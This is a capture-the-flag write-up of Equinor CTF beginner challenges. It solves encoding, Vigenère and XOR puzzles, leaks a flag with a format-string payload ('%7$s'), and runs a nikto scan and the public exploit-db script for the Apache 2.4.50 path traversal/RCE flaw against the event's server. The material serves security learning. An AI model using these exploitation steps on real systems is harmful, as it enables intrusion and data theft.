# Beginner challenges

## Sanity

This one gives you the flag just for connecting.\
Sometimes it's nice just to be appreciated 😊

````
nc io.ept.gg 30020
Welcome to Equinor CTF! Enter to get your sanity flag!
>
EPT{let_the_games_begin}
````


## Encoding or encryption

Task:
```
Is encoding and encryption the same thing?

55 6b 4e 48 65 32 6f 7a 58 32 4e 6f 5a 31 39 6d 4d 48 6f 7a 58 7a 4e 68 63 44 42 78 64 6d 46 30 58 7a 46 68 58 32 77 77 61 47 56 66 4d 32 46 77 5a 57 78 6e 64 6a 42 68 66 51 3d 3d
```
Using the ever handy Cyberchef:
String from hex, looks base64 enocded(ends in ==)\
A string with RCG{ with the hin "is decoding the same as encoding" like ROT13\
==> `EPT{w3_put_s0m3_3nc0ding_1n_y0ur_3ncryti0n}`

## Baby0

File baby0 in Taskfiles.

Task:
`Magical strings are great`

From a linux box run the command `strings| grep EPT` to get:\
`EPT{strings_are_great!}`

Strings command will extract any string in a binary file and print it. We know how the flag looks, and I was too lazy to use the full regex.

## Cipher salad with vinaigrette is so tasty

Task is picture of Mr. Vignère and a file: vignere-cipher.txt in Taskfiles.

The picture of Mr. Vignère, the cipher.txt file contains years and wordspacing clearly looking like the  wikipedia entry \
for the Vignère cipher. [https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher]  \
Rather large ciphertext that ends with the string:  `RVD{zgzlvwzw_In_E_cml_Hw_Tht}`

Tries the vignere solver on : [https://www.boxentriq.com/code-breaking/vigenere-cipher]  ,and autosolve gets pretty close.\
Tries several times with larger and larger keysizes and ends up with:\
`thisisaverystrongkey`

Back to Cyberchef to translate the entire ciphertext with a vignère decode module, inserting the key from above and we get\
`congratulations you have found the flag: EPT{vigenere_Is_A_lot_Of_Fun}`

## I think we have a roof leak

Task:
``` 
The printf function in expects one or more parameters. In the man page its defined as: int printf(const char *format, ...);

If the first (and only) argument is a pointer string without any formating options it just prints the string. But what happens\
if we only have one argument, that is user controlled?

The man page can be a good place to start.

nc io.ept.gg 30021
```
Taskfiles: pwn1.c and pwn1

Connecting to the instance and it responds with whatever we put into it.\
Googling for any sort of help gets a whole bunch of stack formatting things.\

Basically; give an input with a format string like `%2s` will do magic stuff.\
Shamelessly copying from other CTF writeups indicates that a string "%<number>$s" prints data from the stack.\
Trying a for-loop on the compiled program:\ 

````
for i in ` seq 1 19 `; do echo $i; echo \%${i}\$s | ./pwn1;done
output:
...
6
Enter some text:
(null)
7
Enter some text:
EPT{REDACTED}
8
Enter some text:
Segmentation fault
...
````
Reading the sourcecode provided we see the line `char flag[]  = "EPT{REDACTED}";` so we're getting somewhere

Tries to give the instance the string `'%7$s'`:
```
echo \%7\$s |nc io.ept.gg 30021
Enter some text:
EPT{w00tw00t_you_found_m3}
```

## AH-64
Task:
```
 Super Six One, go to UHF secure. I've got some bad news. We see vulnerabilites like it is 2001. Tango located in /opt/flag

Site: AH-64(links to http://io.ept.gg:30071/ )
```

AH-64 is the Apache helicopter, and we get a link, so clearly an Apache vulnerability.\
Some aimless googling for apache vulnerabilites and a kali linux instance provides the tool `nikto` to scan websites

```
└─# nikto -host io.ept.gg -port 30071
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          176.34.167.207
+ Target Hostname:    io.ept.gg
+ Target Port:        30071
+ Start Time:         2021-10-30 10:41:46 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.50 (Unix)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: POST, OPTIONS, HEAD, GET, TRACE
+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
```

Since we need to find print the output of the file `/opt/flag` on the server we need to run some code, so more googling\
and a `searchsploit apache` looking for Remote Code Execution gives us

```
┌──(root💀cf89b1317ce8)-[/]
└─# searchsploit -p 50406
  Exploit: Apache HTTP Server 2.4.50 - Path Traversal & Remote Code Execution (RCE)
      URL: https://www.exploit-db.com/exploits/50406
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50406.sh
File Type: ASCII text
```
Running the shell to find out what it needs is a targets.txt file with the target and a "command" so...
```
┌──(root💀cf89b1317ce8)-[/]
└─# cat targets.txt
io.ept.gg:30071

┌──(root💀cf89b1317ce8)-[/]
└─# /usr/share/exploitdb/exploits/multiple/webapps/50406.sh targets.txt /opt/flag
io.ept.gg:30071
EPT{we've_got_a_blackhawk_down_we've_got_a_blackhawk_down_i_mean_apache}

```

## never-gonna-exclude-you

Hint: are we eXclusive-OR?\

Taskfile: xor-cipher.txt

Trying the trusty cyberchef gives little results for guessing any xor'ing.\
Googling CTFs and XOR provides the tool `xortool`\
Jumping into a linux instance and running the suggested command on the ciphertext
```
[root@686b9ce9d4ce xor]# yum search xortool
Last metadata expiration check: 0:19:47 ago on Sat Oct 30 11:44:58 2021.
============================================ Name Exactly Matched: xortool =============================================
xortool.noarch : Tool for XOR cipher analysis

[root@686b9ce9d4ce xor]# xortool -x -c ' ' xor-cipher.txt
The most probable key lengths:
   1:   12.2%
   8:   9.7%
  11:   24.1%
  16:   6.6%
  18:   6.4%
  20:   5.7%
  22:   14.1%
  33:   9.1%
  44:   6.9%
  55:   5.4%
Key-length can be 4*n
1 possible key(s) of length 11:
'rick astley
Found 1 plaintexts with 95%+ valid characters
See files filename-key.csv, filename-char_used-perc_valid.csv
```
xortool outputted some files as it says and one contained the plaintext. I'll save you the rolling, but the end of the\
file said `RVBUe3gwci0xNS1mdW59` that Cyberchef easily suggest Base64 decoding to  `EPT{x0r-15-fun}`
